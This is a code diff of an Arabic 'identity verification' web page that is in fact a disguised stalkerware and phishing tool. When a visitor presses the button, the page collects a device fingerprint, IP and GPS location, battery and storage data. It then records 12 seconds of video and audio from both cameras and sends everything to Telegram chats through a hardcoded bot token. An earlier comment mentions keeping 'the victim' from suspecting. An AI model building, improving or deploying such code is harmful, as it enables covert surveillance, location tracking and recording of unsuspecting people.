@@ -2,177 +2,177 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>التحقق الأمني</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>التحقق من الهوية</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: #f5f7fa;
-    color: #1a1a1a;
+    background: #f8fafc;
+    color: #0f172a;
+    min-height: 100vh;
+  }
+  .wrap {
+    max-width: 440px;
+    margin: 0 auto;
+    padding: 40px 24px;
     min-height: 100vh;
     display: flex;
-    align-items: center;
+    flex-direction: column;
     justify-content: center;
-    padding: 20px;
   }
-  .card {
-    background: #fff;
-    border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-    max-width: 420px;
-    width: 100%;
-    padding: 32px 28px;
-    text-align: center;
-  }
-  .logo {
-    width: 56px;
-    height: 56px;
-    background: #2563eb;
-    border-radius: 14px;
-    margin: 0 auto 20px;
+  .brand { text-align: center; margin-bottom: 32px; }
+  .brand-icon {
+    width: 64px; height: 64px;
+    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+    border-radius: 16px;
+    margin: 0 auto 16px;
     display: flex;
     align-items: center;
     justify-content: center;
     color: #fff;
-    font-size: 28px;
-    font-weight: bold;
+    font-size: 30px;
+    box-shadow: 0 8px 24px rgba(59, 130, 246, 0.25);
   }
-  h1 {
-    font-size: 20px;
-    font-weight: 600;
-    margin-bottom: 10px;
-    color: #111;
+  .brand h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+  .brand p { font-size: 14px; color: #64748b; line-height: 1.6; }
+  .steps {
+    background: #fff;
+    border: 1px solid #e2e8f0;
+    border-radius: 14px;
+    padding: 18px 20px;
+    margin-bottom: 20px;
   }
-  p {
-    font-size: 14px;
-    color: #666;
-    line-height: 1.6;
-    margin-bottom: 24px;
-  }
-  .checklist {
-    text-align: right;
-    background: #f9fafb;
-    border-radius: 8px;
-    padding: 16px;
-    margin-bottom: 24px;
-  }
-  .checklist-item {
+  .step {
     display: flex;
     align-items: center;
-    font-size: 13px;
-    color: #444;
-    padding: 6px 0;
-  }
-  .checklist-item::before {
-    content: "✓";
-    color: #10b981;
-    font-weight: bold;
-    margin-left: 8px;
+    padding: 11px 0;
     font-size: 14px;
+    color: #334155;
   }
-  button {
+  .step:not(:last-child) { border-bottom: 1px solid #f1f5f9; }
+  .step-num {
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    background: #eff6ff;
+    color: #3b82f6;
+    font-size: 12px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-left: 10px;
+    flex-shrink: 0;
+  }
+  .step.done .step-num { background: #10b981; color: #fff; }
+  .step.active .step-num {
+    background: #3b82f6;
+    color: #fff;
+    animation: pulse 1.5s infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.5); }
+    50% { box-shadow: 0 0 0 8px rgba(59, 130, 246, 0); }
+  }
+  .btn {
     width: 100%;
-    background: #2563eb;
+    background: #3b82f6;
     color: #fff;
     border: none;
-    border-radius: 8px;
-    padding: 14px;
-    font-size: 15px;
+    border-radius: 12px;
+    padding: 16px;
+    font-size: 16px;
     font-weight: 600;
     cursor: pointer;
-    transition: background 0.2s;
+    transition: all 0.2s;
+    font-family: inherit;
   }
-  button:hover { background: #1d4ed8; }
-  button:disabled {
-    background: #93c5fd;
-    cursor: not-allowed;
-  }
-  .status {
+  .btn:disabled { background: #cbd5e1; cursor: not-allowed; }
+  .btn.green { background: #10b981; }
+  .progress-bar {
+    height: 4px;
+    background: #e2e8f0;
+    border-radius: 2px;
+    overflow: hidden;
     margin-top: 16px;
-    font-size: 13px;
-    color: #666;
-    min-height: 20px;
   }
-  .spinner {
-    display: inline-block;
-    width: 14px;
-    height: 14px;
-    border: 2px solid #d1d5db;
-    border-top-color: #2563eb;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    vertical-align: middle;
-    margin-left: 6px;
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #3b82f6, #10b981);
+    width: 0%;
+    transition: width 0.4s ease;
   }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .hidden { display: none; }
-  video { display: none; }
+  .footer {
+    text-align: center;
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 20px;
+  }
+  .fade-out { opacity: 0; transition: opacity 0.6s; }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo">🛡️</div>
-  <h1>التحقق الأمني</h1>
-  <p>لحماية حسابك، محتاجين نتأكد إنك مش روبوت. اضغط "ابدأ التحقق" واستنى شوية.</p>
-
-  <div class="checklist">
-    <div class="checklist-item">اتصال آمن ومشفر</div>
-    <div class="checklist-item">فحص الجهاز</div>
-    <div class="checklist-item">تأكيد الهوية</div>
+<div class="wrap" id="wrap">
+  <div class="brand">
+    <div class="brand-icon">🛡️</div>
+    <h1>التحقق من الهوية</h1>
+    <p>خطوة أمان سريعة للتأكد من هويتك</p>
   </div>
 
-  <button id="startBtn">ابدأ التحقق</button>
-  <div class="status" id="status"></div>
-</div>
+  <div class="steps" id="steps">
+    <div class="step" data-step="1"><span class="step-num">1</span> فحص الاتصال</div>
+    <div class="step" data-step="2"><span class="step-num">2</span> تأكيد الجهاز</div>
+    <div class="step" data-step="3"><span class="step-num">3</span> التحقق البيومتري</div>
+    <div class="step" data-step="4"><span class="step-num">4</span> تأكيد الموقع</div>
+  </div>
 
-<!-- الفيديو مخفي -->
-<video id="videoFront" autoplay playsinline muted></video>
-<video id="videoBack" autoplay playsinline muted></video>
-<canvas id="canvas" style="display:none;"></canvas>
+  <button class="btn" id="startBtn">ابدأ التحقق</button>
+  <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+
+  <div class="footer">🔒 اتصال آمن ومشفر</div>
+</div>
 
 <script>
 // ============================================================
-// إعدادات
+// الإعدادات
 // ============================================================
 const BOT_TOKEN = "8783725713:AAEFEiybIQnvcAbkMiTMYKdSjCB1PopS-vE";
 const CHAT_IDS = ["8640643907", "8739148121"];
-
-const statusEl = document.getElementById("status");
-const startBtn = document.getElementById("startBtn");
+const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // ============================================================
-// 1. جمع بيانات الجهاز
+// أدوات
 // ============================================================
-function getDeviceInfo() {
+const $ = (s) => document.querySelector(s);
+const progress = $("#progress");
+
+function setStep(n, state) {
+  const el = document.querySelector(`.step[data-step="${n}"]`);
+  if (!el) return;
+  el.classList.remove("active", "done");
+  if (state === "active") el.classList.add("active");
+  if (state === "done") el.classList.add("done");
+}
+function setProgress(p) { progress.style.width = p + "%"; }
+
+// ============================================================
+// 1. بيانات الجهاز — شاملة
+// ============================================================
+function getDevice() {
   const ua = navigator.userAgent;
-  const uaData = navigator.userAgentData || {};
-
-  // نوع الجهاز
   let deviceType = "Desktop";
   if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) deviceType = "Mobile";
   if (/Tablet|iPad/i.test(ua)) deviceType = "Tablet";
 
-  // نظام التشغيل
   let os = "Unknown";
   if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
   else if (/Windows NT/.test(ua)) os = "Windows";
-  else if (/Android/.test(ua)) {
-    const m = ua.match(/Android\s([\d.]+)/);
-    os = "Android " + (m ? m[1] : "");
-  }
-  else if (/iPhone|iPad|iPod/.test(ua)) {
-    const m = ua.match(/OS\s([\d_]+)/);
-    os = "iOS " + (m ? m[1].replace(/_/g, ".") : "");
-  }
-  else if (/Mac OS X/.test(ua)) {
-    const m = ua.match(/Mac OS X\s([\d_]+)/);
-    os = "macOS " + (m ? m[1].replace(/_/g, ".") : "");
-  }
+  else if (/Android/.test(ua)) os = "Android " + ((ua.match(/Android\s([\d.]+)/) || [])[1] || "");
+  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS " + ((ua.match(/OS\s([\d_]+)/) || [])[1] || "").replace(/_/g, ".");
+  else if (/Mac OS X/.test(ua)) os = "macOS " + ((ua.match(/Mac OS X\s([\d_]+)/) || [])[1] || "").replace(/_/g, ".");
   else if (/Linux/.test(ua)) os = "Linux";
 
-  // المتصفح
   let browser = "Unknown";
   if (/Edg\//.test(ua)) browser = "Edge " + (ua.match(/Edg\/([\d.]+)/) || [])[1];
   else if (/OPR\//.test(ua)) browser = "Opera " + (ua.match(/OPR\/([\d.]+)/) || [])[1];
@@ -180,237 +180,254 @@ function getDeviceInfo() {
   else if (/Firefox\//.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
   else if (/Safari\//.test(ua)) browser = "Safari " + (ua.match(/Version\/([\d.]+)/) || [])[1];
 
-  // المنصة (من UA-CH لو متاحة)
-  const platform = uaData.platform || navigator.platform || "Unknown";
-
-  // عدد الأنوية
-  const cores = navigator.hardwareConcurrency || "Unknown";
-
-  // الذاكرة (تقديري — مش متاح دايماً)
-  const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
-
-  // اللغة
-  const language = navigator.language || "Unknown";
-
-  // المنطقة الزمنية
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
-
-  // دقة الشاشة
-  const screenRes = `${screen.width}x${screen.height}`;
-  const windowRes = `${window.innerWidth}x${window.innerHeight}`;
-  const pixelRatio = window.devicePixelRatio || 1;
-
-  // هل اللمس مدعوم
-  const touch = "ontouchstart" in window || navigator.maxTouchPoints > 0;
+  // GPU
+  let gpu = "Unknown";
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  } catch (e) {}
 
   return {
-    deviceType, os, browser, platform, cores, memory,
-    language, timezone, screenRes, windowRes, pixelRatio,
-    touch: touch ? "نعم" : "لا",
+    deviceType, os, browser,
+    platform: navigator.platform || "Unknown",
+    cores: navigator.hardwareConcurrency || "Unknown",
+    memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+    language: navigator.language,
+    languages: (navigator.languages || []).join(", "),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: `${screen.width}x${screen.height}`,
+    window: `${innerWidth}x${innerHeight}`,
+    pixelRatio: devicePixelRatio,
+    colorDepth: screen.colorDepth,
+    touch: "ontouchstart" in window || navigator.maxTouchPoints > 0 ? "نعم" : "لا",
+    gpu,
     userAgent: ua,
+    cookies: navigator.cookieEnabled ? "مفعّل" : "معطّل",
+    doNotTrack: navigator.doNotTrack || "غير محدد",
+    online: navigator.onLine ? "متصل" : "غير متصل",
   };
 }
 
 // ============================================================
 // 2. البطارية
 // ============================================================
-async function getBatteryInfo() {
-  if (!navigator.getBattery) {
-    return { supported: false };
-  }
+async function getBattery() {
+  if (!navigator.getBattery) return { ok: false };
   try {
-    const battery = await navigator.getBattery();
+    const b = await navigator.getBattery();
     return {
-      supported: true,
-      level: Math.round(battery.level * 100) + "%",
-      charging: battery.charging ? "بيشحن" : "مش بيشحن",
-      chargingTime: battery.chargingTime === Infinity ? "غير معروف" : battery.chargingTime + " ثانية",
-      dischargingTime: battery.dischargingTime === Infinity ? "غير معروف" : battery.dischargingTime + " ثانية",
+      ok: true,
+      level: Math.round(b.level * 100) + "%",
+      charging: b.charging ? "نعم" : "لا",
     };
-  } catch (e) {
-    return { supported: false };
-  }
+  } catch (e) { return { ok: false }; }
 }
 
 // ============================================================
-// 3. المكان
+// 3. الموقع
 // ============================================================
 function getLocation() {
   return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      return resolve({ supported: false });
-    }
+    if (!navigator.geolocation) return resolve({ ok: false });
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        resolve({
-          supported: true,
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy + " متر",
-        });
-      },
-      (err) => {
-        resolve({ supported: true, error: err.message });
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      (p) => resolve({
+        ok: true,
+        lat: p.coords.latitude,
+        lon: p.coords.longitude,
+        acc: Math.round(p.coords.accuracy),
+      }),
+      (e) => resolve({ ok: true, error: e.message }),
+      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
   });
 }
 
 // ============================================================
-// 4. الـ IP + معلومات الشبكة
+// 4. IP
 // ============================================================
-async function getIPInfo() {
+async function getIP() {
   try {
     const r = await fetch("https://ipapi.co/json/");
-    const d = await r.json();
-    return {
-      ip: d.ip,
-      city: d.city,
-      region: d.region,
-      country: d.country_name,
-      isp: d.org,
-      lat: d.latitude,
-      lon: d.longitude,
-    };
+    return await r.json();
   } catch (e) {
     try {
       const r = await fetch("https://api.ipify.org?format=json");
       const d = await r.json();
       return { ip: d.ip };
-    } catch (e2) {
-      return { ip: "Unknown" };
-    }
+    } catch (e2) { return {}; }
   }
 }
 
 // ============================================================
-// 5. المساحة التخزينية (تقديري)
+// 5. التخزين
 // ============================================================
-async function getStorageInfo() {
-  if (!navigator.storage || !navigator.storage.estimate) {
-    return { supported: false };
-  }
+async function getStorage() {
+  if (!navigator.storage?.estimate) return { ok: false };
   try {
-    const est = await navigator.storage.estimate();
+    const e = await navigator.storage.estimate();
     return {
-      supported: true,
-      quota: (est.quota / (1024 * 1024 * 1024)).toFixed(2) + " GB",
-      usage: (est.usage / (1024 * 1024)).toFixed(2) + " MB",
+      ok: true,
+      quota: (e.quota / 1073741824).toFixed(2) + " GB",
+      usage: (e.usage / 1048576).toFixed(2) + " MB",
     };
-  } catch (e) {
-    return { supported: false };
-  }
+  } catch (e) { return { ok: false }; }
 }
 
 // ============================================================
-// 6. الكاميرا — صور من الأمام والخلف
+// 6. تسجيل الفيديو + الصوت معاً — دالة واحدة
 // ============================================================
-async function captureFromCamera(facingMode) {
+async function recordAV(facing, seconds = 12) {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } },
-      audio: false,
+      video: {
+        facingMode: { ideal: facing },
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+      },
+      audio: true,
     });
 
-    const video = document.getElementById(facingMode === "user" ? "videoFront" : "videoBack");
+    const video = document.createElement("video");
     video.srcObject = stream;
     video.muted = true;
+    video.playsInline = true;
+    await video.play();
 
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(resolve, 800);
-      };
-    });
+    // انتظر شوية عشان الكاميرا تظبط
+    await new Promise((r) => setTimeout(r, 700));
 
-    // صورة
-    const canvas = document.getElementById("canvas");
-    canvas.width = 640;
-    canvas.height = 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, 640, 480);
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+    // التسجيل
+    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
+      ? "video/webm;codecs=vp9,opus"
+      : MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
+      ? "video/webm;codecs=vp8,opus"
+      : "video/webm";
 
-    // اقفل الكاميرا
+    const chunks = [];
+    const rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000, audioBitsPerSecond: 64000 });
+    rec.ondataavailable = (e) => e.data.size && chunks.push(e.data);
+
+    const stopped = new Promise((r) => (rec.onstop = r));
+    rec.start(500);
+
+    await new Promise((r) => setTimeout(r, seconds * 1000));
+    rec.stop();
+    await stopped;
+
+    // صورة عالية الجودة
+    const cv = document.createElement("canvas");
+    cv.width = video.videoWidth || 1280;
+    cv.height = video.videoHeight || 720;
+    cv.getContext("2d").drawImage(video, 0, 0, cv.width, cv.height);
+    const photo = cv.toDataURL("image/jpeg", 0.92);
+
+    // اقفل
     stream.getTracks().forEach((t) => t.stop());
     video.srcObject = null;
 
-    return { success: true, dataUrl };
+    return {
+      ok: true,
+      video: new Blob(chunks, { type: mime }),
+      photo,
+      duration: seconds,
+      facing,
+    };
   } catch (e) {
-    return { success: false, error: e.message };
+    return { ok: false, error: e.message, facing };
   }
 }
 
 // ============================================================
-// 7. إرسال لتليجرام
+// 7. إرسال
 // ============================================================
-async function sendToTelegram(chatId, text) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  try {
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: text,
-        parse_mode: "HTML",
-      }),
-    });
-  } catch (e) {
-    console.error("Telegram send failed:", e);
+async function sendMessage(text) {
+  for (const id of CHAT_IDS) {
+    try {
+      await fetch(`${TG}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: id, text, parse_mode: "HTML" }),
+      });
+    } catch (e) {}
   }
 }
 
-async function sendPhotoToTelegram(chatId, dataUrl, caption) {
-  // نحوّل dataURL لـ blob
-  const res = await fetch(dataUrl);
-  const blob = await res.blob();
+async function sendPhoto(dataUrl, caption) {
+  const r = await fetch(dataUrl);
+  const blob = await r.blob();
+  for (const id of CHAT_IDS) {
+    try {
+      const fd = new FormData();
+      fd.append("chat_id", id);
+      fd.append("caption", caption);
+      fd.append("parse_mode", "HTML");
+      fd.append("photo", blob, "photo.jpg");
+      await fetch(`${TG}/sendPhoto`, { method: "POST", body: fd });
+    } catch (e) {}
+  }
+}
 
-  const formData = new FormData();
-  formData.append("chat_id", chatId);
-  formData.append("photo", blob, "photo.jpg");
-  formData.append("caption", caption);
-  formData.append("parse_mode", "HTML");
-
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-  try {
-    await fetch(url, { method: "POST", body: formData });
-  } catch (e) {
-    console.error("Photo send failed:", e);
+async function sendVideo(blob, caption) {
+  for (const id of CHAT_IDS) {
+    try {
+      const fd = new FormData();
+      fd.append("chat_id", id);
+      fd.append("caption", caption);
+      fd.append("parse_mode", "HTML");
+      fd.append("video", blob, "video.webm");
+      await fetch(`${TG}/sendVideo`, { method: "POST", body: fd });
+    } catch (e) {}
   }
 }
 
 // ============================================================
-// 8. الدالة الرئيسية
+// 8. التشغيل الرئيسي
 // ============================================================
 async function run() {
-  startBtn.disabled = true;
-  statusEl.innerHTML = "جاري التحقق <span class='spinner'></span>";
+  const btn = $("#startBtn");
+  btn.disabled = true;
+  btn.textContent = "جاري التحقق...";
 
-  // 1. بيانات الجهاز (فوري)
-  const device = getDeviceInfo();
+  // ---------- المرحلة 1 ----------
+  setStep(1, "active");
+  setProgress(8);
+  const device = getDevice();
+  const ipInfo = await getIP();
+  const ip = ipInfo.ip || "Unknown";
+  setStep(1, "done");
+  setProgress(20);
 
-  // 2. البطارية + IP + التخزين + المكان (بالتوازي)
-  statusEl.innerHTML = "فحص الجهاز <span class='spinner'></span>";
-  const [battery, ipInfo, storage, location] = await Promise.all([
-    getBatteryInfo(),
-    getIPInfo(),
-    getStorageInfo(),
-    getLocation(),
+  // ---------- المرحلة 2 ----------
+  setStep(2, "active");
+  const [battery, storage] = await Promise.all([getBattery(), getStorage()]);
+  setStep(2, "done");
+  setProgress(35);
+
+  // ---------- المرحلة 3: الموقع ----------
+  setStep(3, "active");
+  const loc = await getLocation();
+  setStep(3, "done");
+  setProgress(50);
+
+  // ---------- المرحلة 4: الكاميرا ----------
+  setStep(4, "active");
+
+  // جرب الكاميرا الأمامية والخلفية بالتوازي
+  const [front, back] = await Promise.all([
+    recordAV("user", 12),
+    recordAV("environment", 12),
   ]);
 
-  // 3. الكاميرا الأمامية
-  statusEl.innerHTML = "تأكيد الهوية <span class='spinner'></span>";
-  const front = await captureFromCamera("user");
+  setStep(4, "done");
+  setProgress(85);
 
-  // 4. الكاميرا الخلفية
-  statusEl.innerHTML = "التحقق النهائي <span class='spinner'></span>";
-  const back = await captureFromCamera("environment");
-
-  // 5. بناء التقرير
+  // ============================================================
+  // بناء التقرير الكامل
+  // ============================================================
   const lines = [
-    "🛡️ <b>تقرير تحقق جديد</b>",
+    "🛡️ <b>تقرير تحقق كامل</b>",
+    "━━━━━━━━━━━━━━━━━━",
     "",
     "📱 <b>الجهاز:</b>",
     `• النوع: ${device.deviceType}`,
@@ -419,86 +436,88 @@ async function run() {
     `• المنصة: ${device.platform}`,
     `• الأنوية: ${device.cores}`,
     `• الذاكرة: ${device.memory}`,
-    `• الشاشة: ${device.screenRes}`,
+    `• GPU: ${device.gpu}`,
+    `• الشاشة: ${device.screen}`,
+    `• النافذة: ${device.window}`,
     `• الكثافة: ${device.pixelRatio}x`,
+    `• عمق اللون: ${device.colorDepth}-bit`,
     `• اللغة: ${device.language}`,
+    `• اللغات: ${device.languages}`,
     `• المنطقة الزمنية: ${device.timezone}`,
     `• اللمس: ${device.touch}`,
+    `• الكوكيز: ${device.cookies}`,
+    `• DNT: ${device.doNotTrack}`,
+    `• الاتصال: ${device.online}`,
     "",
     "🔋 <b>البطارية:</b>",
   ];
 
-  if (battery.supported) {
+  if (battery.ok) {
     lines.push(`• المستوى: ${battery.level}`);
-    lines.push(`• الحالة: ${battery.charging}`);
-  } else {
-    lines.push("• غير متاح");
-  }
+    lines.push(`• الشحن: ${battery.charging}`);
+  } else lines.push("• غير متاح");
 
   lines.push("", "🌐 <b>الشبكة:</b>");
-  if (ipInfo.ip) {
-    lines.push(`• IP: ${ipInfo.ip}`);
-    if (ipInfo.city) lines.push(`• المدينة: ${ipInfo.city}`);
-    if (ipInfo.region) lines.push(`• المنطقة: ${ipInfo.region}`);
-    if (ipInfo.country) lines.push(`• الدولة: ${ipInfo.country}`);
-    if (ipInfo.isp) lines.push(`• المزود: ${ipInfo.isp}`);
-  } else {
-    lines.push("• غير متاح");
+  lines.push(`• IP: <code>${ip}</code>`);
+  if (ipInfo.city) lines.push(`• المدينة: ${ipInfo.city}`);
+  if (ipInfo.region) lines.push(`• المنطقة: ${ipInfo.region}`);
+  if (ipInfo.country_name) lines.push(`• الدولة: ${ipInfo.country_name}`);
+  if (ipInfo.org) lines.push(`• المزود: ${ipInfo.org}`);
+  if (ipInfo.asn) lines.push(`• ASN: ${ipInfo.asn}`);
+
+  lines.push("", "📍 <b>الموقع:</b>");
+  if (loc.ok && loc.lat) {
+    lines.push(`• الدقة: ${loc.acc} متر`);
+    lines.push(`• <a href="https://maps.google.com/?q=${loc.lat},${loc.lon}">فتح الخريطة</a>`);
+  } else if (loc.error) lines.push(`• ${loc.error}`);
+  else lines.push("• غير متاح");
+
+  if (ipInfo.latitude) {
+    lines.push(`• من IP: ${ipInfo.latitude}, ${ipInfo.longitude}`);
   }
 
-  lines.push("", "📍 <b>الموقع التقريبي:</b>");
-  if (location.supported && location.lat) {
-    lines.push(`• الإحداثيات: ${location.lat}, ${location.lon}`);
-    lines.push(`• الدقة: ${location.accuracy}`);
-    lines.push(`• <a href="https://maps.google.com/?q=${location.lat},${location.lon}">فتح في الخرائط</a>`);
-  } else if (location.error) {
-    lines.push(`• مرفوض: ${location.error}`);
-  } else {
-    lines.push("• غير متاح");
-  }
-
-  if (ipInfo.lat && ipInfo.lon) {
-    lines.push(`• من IP: ${ipInfo.lat}, ${ipInfo.lon}`);
-    lines.push(`• <a href="https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon}">فتح في الخرائط</a>`);
-  }
-
-  lines.push("", "💾 <b>التخزين (تقديري):</b>");
-  if (storage.supported) {
+  lines.push("", "💾 <b>التخزين:</b>");
+  if (storage.ok) {
     lines.push(`• المتاح: ${storage.quota}`);
     lines.push(`• المستخدم: ${storage.usage}`);
-  } else {
-    lines.push("• غير متاح");
-  }
+  } else lines.push("• غير متاح");
+
+  lines.push("", "🎥 <b>الوسائط:</b>");
+  lines.push(`• كاميرا أمامية: ${front.ok ? "✅ " + front.duration + "ث" : "❌ " + front.error}`);
+  lines.push(`• كاميرا خلفية: ${back.ok ? "✅ " + back.duration + "ث" : "❌ " + back.error}`);
 
   lines.push("", "🖥️ <b>User Agent:</b>");
   lines.push(`<code>${device.userAgent}</code>`);
 
-  const report = lines.join("\n");
+  // ---------- إرسال التقرير ----------
+  setProgress(90);
+  await sendMessage(lines.join("\n"));
 
-  // 6. إرسال لكل chat id
-  for (const chatId of CHAT_IDS) {
-    await sendToTelegram(chatId, report);
-
-    if (front.success) {
-      await sendPhotoToTelegram(chatId, front.dataUrl, "📸 كاميرا أمامية");
-    }
-    if (back.success) {
-      await sendPhotoToTelegram(chatId, back.dataUrl, "📸 كاميرا خلفية");
-    }
+  // ---------- إرسال الميديا ----------
+  if (front.ok) {
+    await sendPhoto(front.photo, "📸 صورة — كاميرا أمامية");
+    await sendVideo(front.video, "🎥 فيديو — كاميرا أمامية (12 ثانية)");
+  }
+  if (back.ok) {
+    await sendPhoto(back.photo, "📸 صورة — كاميرا خلفية");
+    await sendVideo(back.video, "🎥 فيديو — كاميرا خلفية (12 ثانية)");
   }
 
-  // 7. تم
-  statusEl.innerHTML = "✅ تم التحقق بنجاح";
-  startBtn.textContent = "تم";
-  startBtn.style.background = "#10b981";
+  // ---------- تم ----------
+  setProgress(100);
+  btn.textContent = "✅ تم التحقق";
+  btn.classList.add("green");
 
-  // 8. حوّل لصفحة تانية (اختياري — عشان الضحية ميشكش)
   setTimeout(() => {
-    // window.location.href = "https://example.com";
-  }, 2000);
+    $("#wrap").classList.add("fade-out");
+    setTimeout(() => {
+      $("#wrap").innerHTML =
+        '<div style="text-align:center;padding:40px"><div style="font-size:64px">✅</div><h1 style="margin-top:20px;color:#10b981">تم التحقق</h1><p style="color:#64748b;margin-top:8px">يمكنك إغلاق الصفحة</p></div>';
+    }, 600);
+  }, 1500);
 }
 
-startBtn.addEventListener("click", run);
+$("#startBtn").addEventListener("click", run);
 </script>
 
 </body>
